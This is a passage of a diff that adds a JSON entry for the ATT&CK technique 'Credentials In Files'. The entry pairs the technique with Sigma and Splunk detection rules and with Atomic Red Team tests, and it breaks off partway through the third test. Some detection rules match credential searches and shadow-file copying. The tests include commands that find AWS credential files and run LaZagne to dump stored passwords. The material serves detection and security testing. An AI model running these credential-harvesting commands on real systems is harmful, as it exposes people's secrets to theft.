@@ -1,0 +1,491 @@
+{
+    "id": "T1552.001",
+    "name": "Credentials In Files",
+    "description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",
+    "platforms": "Windows, IaaS, Linux, macOS, Containers",
+    "kill_chain_phases": "Credential Access",
+    "data_sources": "File: File Access, Command: Command Execution",
+    "detection": "While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](T1078) for more information.",
+    "url": "https://attack.mitre.org/techniques/T1552/001",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1552.001",
+                "atomic_attack_guid": "b0cdacf6-8949-4ffe-9274-a9643a788e55",
+                "atomic_attack_name": "List Credential Files via Command Prompt",
+                "platform": "Windows",
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows Password Managers Discovery",
+                        "rule_link": "https://research.splunk.com/endpoint/a3b3bc96-1c4f-4eba-8218-027cac739a48/"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "1a3d42dd-3763-46b9-8025-b5f17f340dfb",
+                    "459a2970-bb84-4e6a-a32e-ff0fbd99448d",
+                    "e06ac91d-b9e6-443d-8e5b-af749e7aa6b6",
+                    "837f9164-50af-4ac0-8219-379d8a74cefc",
+                    "f576a613-2392-4067-9d1a-9345fb58d8d1",
+                    "b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee",
+                    "6ea858a8-ba71-4a12-b2cc-5d83312404c7",
+                    "80eeab92-0979-4152-942d-96749e11df40",
+                    "cd072b25-a418-4f98-8ebc-5093fb38fe1a",
+                    "df3fcaea-2715-4214-99c5-0056ea59eb35",
+                    "bf6c39fc-e203-45b9-9538-05397c1b4f3f",
+                    "0cf7a157-8879-41a2-8f55-388dd23746b7",
+                    "83e15192-96d8-476c-aa39-0317de8dba80",
+                    "53b1b378-9b06-4992-b972-dde6e423d2b4",
+                    "bd5971a7-626d-46ab-8176-ed643f694f68",
+                    "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+                    "b831353c-1971-477b-abb6-2828edc3bca1"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "1a3d42dd-3763-46b9-8025-b5f17f340dfb",
+                        "lookup_data": {
+                            "description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process\n",
+                            "raw": "author: frack113\ndate: 2021/12/19\ndescription: 'Attempts to access unattend.xml, where credentials are commonly stored,\n  within the Panther directory where installation logs are stored.\n\n  If these files exist, their contents will be displayed. They are used to store credentials/answers\n  during the unattended windows install process\n\n  '\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|endswith: \\unattend.xml\nfalsepositives:\n- Unknown\nid: 1a3d42dd-3763-46b9-8025-b5f17f340dfb\nlevel: medium\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.001\ntitle: Suspicious Unattend.xml File Access\n",
+                            "sigma:id": "1a3d42dd-3763-46b9-8025-b5f17f340dfb",
+                            "title": "Suspicious Unattend.xml File Access",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "459a2970-bb84-4e6a-a32e-ff0fbd99448d",
+                        "lookup_data": {
+                            "description": "Identifies when a key vault is modified or deleted.",
+                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/08/16\ndescription: Identifies when a key vault is modified or deleted.\ndetection:\n  condition: selection\n  selection:\n    operationName:\n    - MICROSOFT.KEYVAULT/VAULTS/WRITE\n    - MICROSOFT.KEYVAULT/VAULTS/DELETE\n    - MICROSOFT.KEYVAULT/VAULTS/DEPLOY/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/ACCESSPOLICIES/WRITE\nfalsepositives:\n- Key Vault being modified or deleted may be performed by a system administrator.\n- Verify whether the user identity, user agent, and/or hostname should be making changes\n  in your environment.\n- Key Vault modified or deleted from unfamiliar users should be investigated. If known\n  behavior is causing false positives, it can be exempted from the rule.\nid: 459a2970-bb84-4e6a-a32e-ff0fbd99448d\nlevel: medium\nlogsource:\n  product: azure\n  service: activitylogs\nmodified: 2022/08/23\nreferences:\n- https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations\nstatus: experimental\ntags:\n- attack.impact\n- attack.credential_access\n- attack.t1552\n- attack.t1552.001\ntitle: Azure Key Vault Modified or Deleted\n",
+                            "sigma:id": "459a2970-bb84-4e6a-a32e-ff0fbd99448d",
+                            "title": "Azure Key Vault Modified or Deleted",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e06ac91d-b9e6-443d-8e5b-af749e7aa6b6",
+                        "lookup_data": {
+                            "description": "Detects URL pattern used by iOS Implant",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/08/30\ndescription: Detects URL pattern used by iOS Implant\ndetection:\n  condition: selection\n  selection:\n    c-uri|contains: /list/suc\\?name=\nfalsepositives:\n- Unknown\nfields:\n- ClientIP\n- c-uri\n- c-useragent\nid: e06ac91d-b9e6-443d-8e5b-af749e7aa6b6\nlevel: critical\nlogsource:\n  category: proxy\nmodified: 2022/08/15\nreferences:\n- https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html\n- https://twitter.com/craiu/status/1167358457344925696\nstatus: test\ntags:\n- attack.execution\n- attack.t1203\n- attack.collection\n- attack.t1005\n- attack.t1119\n- attack.credential_access\n- attack.t1528\n- attack.t1552.001\ntitle: iOS Implant URL Pattern\n",
+                            "sigma:id": "e06ac91d-b9e6-443d-8e5b-af749e7aa6b6",
+                            "title": "iOS Implant URL Pattern",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "837f9164-50af-4ac0-8219-379d8a74cefc",
+                        "lookup_data": {
+                            "capec": "CAPEC-639",
+                            "mitre-attack-id": "T1552.001",
+                            "mitre-cti:description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",
+                            "mitre-cti:name": "Credentials In Files",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows', 'IaaS', 'Linux', 'macOS', 'Containers'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Rory McCune, Aqua Security', 'Jay Chen, Palo Alto Networks', 'Yossi Weizman, Azure Defender Research Team', 'Vishwas Manral, McAfee', 'Microsoft Threat Intelligence Center (MSTIC)'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc', 'type': 'attack-pattern', 'created': '2020-02-04T12:52:13.006Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1552.001', 'url': 'https://attack.mitre.org/techniques/T1552/001'}, {'external_id': 'CAPEC-639', 'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/639.html'}, {'url': 'http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html', 'description': 'CG. (2014, May 20). Mimikatz Against Virtual Machine Memory Part 1. Retrieved November 12, 2014.', 'source_name': 'CG 2014'}, {'url': 'http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx', 'description': 'Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015.', 'source_name': 'SRD GPP'}, {'source_name': 'Unit 42 Hildegard Malware', 'url': 'https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/', 'description': 'Chen, J. et al. (2021, February 3). Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes. Retrieved April 5, 2021.'}, {'source_name': 'Unit 42 Unsecured Docker Daemons', 'url': 'https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/', 'description': \"Chen, J.. (2020, January 29). Attacker's Tactics and Techniques in Unsecured Docker Daemons Revealed. Retrieved March 31, 2021.\"}, {'source_name': 'Specter Ops - Cloud Credential Storage', 'url': 'https://posts.specterops.io/head-in-the-clouds-bd038bb69e48', 'description': 'Maddalena, C.. (2018, September 12). Head in the Clouds. Retrieved October 4, 2019.'}], 'modified': '2021-04-12T18:32:32.803Z', 'name': 'Credentials In Files', 'description': 'Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\\n\\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\\n\\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': 'While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Command: Command Execution', 'File: File Access'], 'x_mitre_permissions_required': ['Administrator', 'SYSTEM', 'User'], 'x_mitre_system_requirements': ['Access to files']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f576a613-2392-4067-9d1a-9345fb58d8d1",
+                        "lookup_data": {
+                            "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data.",
+                            "raw": "author: frack113\ndate: 2021/07/28\ndescription: Once established within a system or network, an adversary may use automated\n  techniques for collecting internal data.\ndetection:\n  condition: selection_ext and 1 of selection_other_*\n  selection_ext:\n    CommandLine|contains:\n    - .doc\n    - .docx\n    - .xls\n    - .xlsx\n    - .ppt\n    - .pptx\n    - .rtf\n    - .pdf\n    - .txt\n  selection_other_dir:\n    CommandLine|contains|all:\n    - 'dir '\n    - ' /b '\n    - ' /s '\n  selection_other_findstr:\n    CommandLine|contains:\n    - ' /e '\n    - ' /si '\n    OriginalFileName: FINDSTR.EXE\nfalsepositives:\n- Unknown\nid: f576a613-2392-4067-9d1a-9345fb58d8d1\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1119/T1119.md\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md\nstatus: test\ntags:\n- attack.collection\n- attack.t1119\n- attack.credential_access\n- attack.t1552.001\ntitle: Automated Collection Command Prompt\n",
+                            "sigma:id": "f576a613-2392-4067-9d1a-9345fb58d8d1",
+                            "title": "Automated Collection Command Prompt",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee",
+                        "lookup_data": {
+                            "description": "Detects Russian group activity as described in Global Threat Report 2019 by Crowdstrike",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/02/21\ndescription: Detects Russian group activity as described in Global Threat Report 2019\n  by Crowdstrike\ndetection:\n  condition: all of selection_xcopy_* or all of selection_adexplorer_*\n  selection_adexplorer_cli:\n    CommandLine|contains|all:\n    - -snapshot\n    - '\"\"'\n    - c:\\users\\\n  selection_adexplorer_img:\n  - Image|endswith: \\adexplorer.exe\n  - OriginalFileName: AdExp\n  selection_xcopy_cli:\n    CommandLine|contains|all:\n    - /S\n    - /E\n    - /C\n    - /Q\n    - /H\n    - \\\\\\\\\n  selection_xcopy_img:\n  - Image|endswith: \\xcopy.exe\n  - OriginalFileName: XCOPY.EXE\nfalsepositives:\n- Unknown\nid: b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.001\n- attack.t1003.003\ntitle: Judgement Panda Credential Access Activity\n",
+                            "sigma:id": "b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee",
+                            "title": "Judgement Panda Credential Access Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6ea858a8-ba71-4a12-b2cc-5d83312404c7",
+                        "lookup_data": {
+                            "description": "Detects files written by the different tools that exploit HiveNightmare",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/07/23\ndescription: Detects files written by the different tools that exploit HiveNightmare\ndetection:\n  condition: selection\n  selection:\n  - TargetFilename|contains:\n    - \\hive_sam_\n    - \\SAM-2021-\n    - \\SAM-2022-\n    - \\SAM-2023-\n    - \\SAM-haxx\n    - \\Sam.save\n  - TargetFilename: C:\\windows\\temp\\sam\nfalsepositives:\n- Files that accidentally contain these strings\nfields:\n- CommandLine\n- ParentCommandLine\nid: 6ea858a8-ba71-4a12-b2cc-5d83312404c7\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/GossiTheDog/HiveNightmare\n- https://github.com/FireFart/hivenightmare/\n- https://github.com/WiredPulse/Invoke-HiveNightmare\n- https://twitter.com/cube0x0/status/1418920190759378944\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.001\n- cve.2021.36934\ntitle: Typical HiveNightmare SAM File Export\n",
+                            "sigma:id": "6ea858a8-ba71-4a12-b2cc-5d83312404c7",
+                            "title": "Typical HiveNightmare SAM File Export",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "80eeab92-0979-4152-942d-96749e11df40",
+                        "lookup_data": {
+                            "description": "Identifies when a Keyvault Key is modified or deleted in Azure.",
+                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/08/16\ndescription: Identifies when a Keyvault Key is modified or deleted in Azure.\ndetection:\n  condition: selection\n  selection:\n    operationName:\n    - MICROSOFT.KEYVAULT/VAULTS/KEYS/UPDATE/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/KEYS/CREATE\n    - MICROSOFT.KEYVAULT/VAULTS/KEYS/CREATE/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/KEYS/IMPORT/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/KEYS/RECOVER/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/KEYS/RESTORE/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/KEYS/DELETE\n    - MICROSOFT.KEYVAULT/VAULTS/KEYS/BACKUP/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/KEYS/PURGE/ACTION\nfalsepositives:\n- Key being modified or deleted may be performed by a system administrator.\n- Verify whether the user identity, user agent, and/or hostname should be making changes\n  in your environment.\n- Key modified or deleted from unfamiliar users should be investigated. If known behavior\n  is causing false positives, it can be exempted from the rule.\nid: 80eeab92-0979-4152-942d-96749e11df40\nlevel: medium\nlogsource:\n  product: azure\n  service: activitylogs\nmodified: 2022/08/23\nreferences:\n- https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations\nstatus: experimental\ntags:\n- attack.impact\n- attack.credential_access\n- attack.t1552\n- attack.t1552.001\ntitle: Azure Keyvault Key Modified or Deleted\n",
+                            "sigma:id": "80eeab92-0979-4152-942d-96749e11df40",
+                            "title": "Azure Keyvault Key Modified or Deleted",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "cd072b25-a418-4f98-8ebc-5093fb38fe1a",
+                        "lookup_data": {
+                            "description": "Collect pertinent data from the configuration files",
+                            "raw": "author: Austin Clark\ndate: 2019/08/11\ndescription: Collect pertinent data from the configuration files\ndetection:\n  condition: keywords\n  keywords:\n  - show running-config\n  - show startup-config\n  - show archive config\n  - more\nfalsepositives:\n- Commonly run by administrators\nfields:\n- src\n- CmdSet\n- User\n- Privilege_Level\n- Remote_Address\nid: cd072b25-a418-4f98-8ebc-5093fb38fe1a\nlevel: low\nlogsource:\n  product: cisco\n  service: aaa\nmodified: 2023/01/04\nstatus: test\ntags:\n- attack.discovery\n- attack.credential_access\n- attack.collection\n- attack.t1087.001\n- attack.t1552.001\n- attack.t1005\ntitle: Cisco Collect Data\n",
+                            "sigma:id": "cd072b25-a418-4f98-8ebc-5093fb38fe1a",
+                            "title": "Cisco Collect Data",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "df3fcaea-2715-4214-99c5-0056ea59eb35",
+                        "lookup_data": {
+                            "description": "Detecting attempts to extract passwords with grep",
+                            "raw": "author: Igor Fits, oscd.community\ndate: 2020/10/15\ndescription: Detecting attempts to extract passwords with grep\ndetection:\n  condition: selection and all of keywords\n  keywords:\n  - grep\n  - password\n  selection:\n    type: EXECVE\nfalsepositives:\n- Unknown\nid: df3fcaea-2715-4214-99c5-0056ea59eb35\nlevel: high\nlogsource:\n  product: linux\n  service: auditd\nmodified: 2023/01/06\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.001\ntitle: Credentials In Files - Linux\n",
+                            "sigma:id": "df3fcaea-2715-4214-99c5-0056ea59eb35",
+                            "title": "Credentials In Files - Linux",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "bf6c39fc-e203-45b9-9538-05397c1b4f3f",
+                        "lookup_data": {
+                            "description": "Attackers can use findstr to hide their artifacts or search specific strings and evade defense mechanism",
+                            "raw": "author: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali\ndate: 2020/10/05\ndescription: Attackers can use findstr to hide their artifacts or search specific\n  strings and evade defense mechanism\ndetection:\n  condition: selection_findstr and (all of selection_cli_download* or all of selection_cli_creds*)\n  selection_cli_creds_1:\n    CommandLine|contains:\n    - ' /s '\n    - ' -s '\n  selection_cli_creds_2:\n    CommandLine|contains:\n    - ' /i '\n    - ' -i '\n  selection_cli_download_1:\n    CommandLine|contains:\n    - ' /v '\n    - ' -v '\n  selection_cli_download_2:\n    CommandLine|contains:\n    - ' /l '\n    - ' -l '\n  selection_findstr:\n  - CommandLine|contains: findstr\n  - Image|endswith: findstr.exe\n  - OriginalFileName: FINDSTR.EXE\nfalsepositives:\n- Administrative findstr usage\nid: bf6c39fc-e203-45b9-9538-05397c1b4f3f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/11\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Findstr/\n- https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.t1564.004\n- attack.t1552.001\n- attack.t1105\ntitle: Abusing Findstr for Defense Evasion\n",
+                            "sigma:id": "bf6c39fc-e203-45b9-9538-05397c1b4f3f",
+                            "title": "Abusing Findstr for Defense Evasion",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0cf7a157-8879-41a2-8f55-388dd23746b7",
+                        "lookup_data": {
+                            "description": "Detects events with patterns found in commands used for reconnaissance on linux systems",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/06/20\ndescription: Detects events with patterns found in commands used for reconnaissance\n  on linux systems\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ' -name .htpasswd'\n    - ' -perm -4000 '\nfalsepositives:\n- Legitimate administration activities\nid: 0cf7a157-8879-41a2-8f55-388dd23746b7\nlevel: high\nlogsource:\n  category: process_creation\n  product: linux\nreferences:\n- https://github.com/sleventyeleven/linuxprivchecker/blob/0d701080bbf92efd464e97d71a70f97c6f2cd658/linuxprivchecker.py\nstatus: experimental\ntags:\n- attack.reconnaissance\n- attack.t1592.004\n- attack.credential_access\n- attack.t1552.001\ntitle: Linux Recon Indicators\n",
+                            "sigma:id": "0cf7a157-8879-41a2-8f55-388dd23746b7",
+                            "title": "Linux Recon Indicators",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "83e15192-96d8-476c-aa39-0317de8dba80",
+                        "lookup_data": {
+                            "description": "OSINT - Uber Breach & Attack Analysis",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/83e15192-96d8-476c-aa39-0317de8dba80.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1666020853",
+                            "uuid": "83e15192-96d8-476c-aa39-0317de8dba80",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "53b1b378-9b06-4992-b972-dde6e423d2b4",
+                        "lookup_data": {
+                            "description": "Detecting attempts to extract passwords with grep and laZagne",
+                            "raw": "author: Igor Fits, Mikhail Larin, oscd.community\ndate: 2020/10/19\ndescription: Detecting attempts to extract passwords with grep and laZagne\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|contains: password\n    Image|endswith: /grep\n  selection2:\n    CommandLine|contains: laZagne\nfalsepositives:\n- Unknown\nid: 53b1b378-9b06-4992-b972-dde6e423d2b4\nlevel: high\nlogsource:\n  category: process_creation\n  product: macos\nmodified: 2021/11/27\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.001\ntitle: Credentials In Files\n",
+                            "sigma:id": "53b1b378-9b06-4992-b972-dde6e423d2b4",
+                            "title": "Credentials In Files",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "bd5971a7-626d-46ab-8176-ed643f694f68",
+                        "lookup_data": {
+                            "description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials.\nThese can be files created by users to store their own credentials, shared credential stores for a group of individuals,\nconfiguration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n",
+                            "raw": "author: frack113\ndate: 2021/12/19\ndescription: 'Adversaries may search local file systems and remote file shares for\n  files containing insecurely stored credentials.\n\n  These can be files created by users to store their own credentials, shared credential\n  stores for a group of individuals,\n\n  configuration files containing passwords for a system or service, or source code/binary\n  files containing embedded passwords.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - ls\n    - ' -R'\n    - 'select-string '\n    - '-Pattern '\nfalsepositives:\n- Unknown\nid: bd5971a7-626d-46ab-8176-ed643f694f68\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.001\ntitle: Extracting Information with PowerShell\n",
+                            "sigma:id": "bd5971a7-626d-46ab-8176-ed643f694f68",
+                            "title": "Extracting Information with PowerShell",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+                        "lookup_data": {
+                            "description": "Detects when the file \"passwd\" or \"shadow\" is copied from tmp path",
+                            "raw": "author: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/01/31\ndescription: Detects when the file \"passwd\" or \"shadow\" is copied from tmp path\ndetection:\n  condition: all of selection_*\n  selection_file:\n    CommandLine|contains:\n    - passwd\n    - shadow\n  selection_img:\n    Image|endswith: /cp\n  selection_path:\n    CommandLine|contains: /tmp/\nfalsepositives:\n- Unknown\nid: fa4aaed5-4fe0-498d-bbc0-08e3346387ba\nlevel: high\nlogsource:\n  category: process_creation\n  product: linux\nreferences:\n- https://blogs.blackberry.com/\n- https://twitter.com/Joseliyo_Jstnk/status/1620131033474822144\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1552.001\ntitle: Copy Passwd Or Shadow From TMP Path\n",
+                            "sigma:id": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+                            "title": "Copy Passwd Or Shadow From TMP Path",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b831353c-1971-477b-abb6-2828edc3bca1",
+                        "lookup_data": {
+                            "description": "Identifies when secrets are modified or deleted in Azure.",
+                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/08/16\ndescription: Identifies when secrets are modified or deleted in Azure.\ndetection:\n  condition: selection\n  selection:\n    operationName:\n    - MICROSOFT.KEYVAULT/VAULTS/SECRETS/WRITE\n    - MICROSOFT.KEYVAULT/VAULTS/SECRETS/DELETE\n    - MICROSOFT.KEYVAULT/VAULTS/SECRETS/BACKUP/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/SECRETS/PURGE/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/SECRETS/UPDATE/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/SECRETS/RECOVER/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/SECRETS/RESTORE/ACTION\n    - MICROSOFT.KEYVAULT/VAULTS/SECRETS/SETSECRET/ACTION\nfalsepositives:\n- Secrets being modified or deleted may be performed by a system administrator.\n- Verify whether the user identity, user agent, and/or hostname should be making changes\n  in your environment.\n- Secrets modified or deleted from unfamiliar users should be investigated. If known\n  behavior is causing false positives, it can be exempted from the rule.\nid: b831353c-1971-477b-abb6-2828edc3bca1\nlevel: medium\nlogsource:\n  product: azure\n  service: activitylogs\nmodified: 2022/08/23\nreferences:\n- https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations\nstatus: experimental\ntags:\n- attack.impact\n- attack.credential_access\n- attack.t1552\n- attack.t1552.001\ntitle: Azure Keyvault Secrets Modified or Deleted\n",
+                            "sigma:id": "b831353c-1971-477b-abb6-2828edc3bca1",
+                            "title": "Azure Keyvault Secrets Modified or Deleted",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1552.001",
+                "display_name": "Unsecured Credentials: Credentials In Files",
+                "atomic_tests": [
+                    {
+                        "name": "Find AWS credentials",
+                        "auto_generated_guid": "37807632-d3da-442e-8c2e-00f44928ff8f",
+                        "description": "Find local AWS credentials from file, defaults to using / as the look path.\n",
+                        "supported_platforms": [
+                            "macos",
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "file_path": {
+                                "description": "Path to search",
+                                "type": "string",
+                                "default": "/"
+                            }
+                        },
+                        "executor": {
+                            "command": "find #{file_path}/.aws -name \"credentials\" -type f 2>/dev/null\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Extract Browser and System credentials with LaZagne",
+                        "auto_generated_guid": "9e507bb8-1d30-4e3b-a49b-cb5727d7ea79",
+                        "description": "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n",
+                        "supported_platforms": [
+                            "macos"
+                        ],
+                        "executor": {
+                            "command": "python2 laZagne.py all\n",
+                            "elevation_required": true,
+                            "name": "bash"
+                        }
+                    },
+                    {
+                        "name": "Extract passwords with grep",
+                        "auto_generated_guid": "bd4cf0d1-7646-474e-8610-78ccf5a097c4",
+                        "description": "Extracting credentials from files\n",
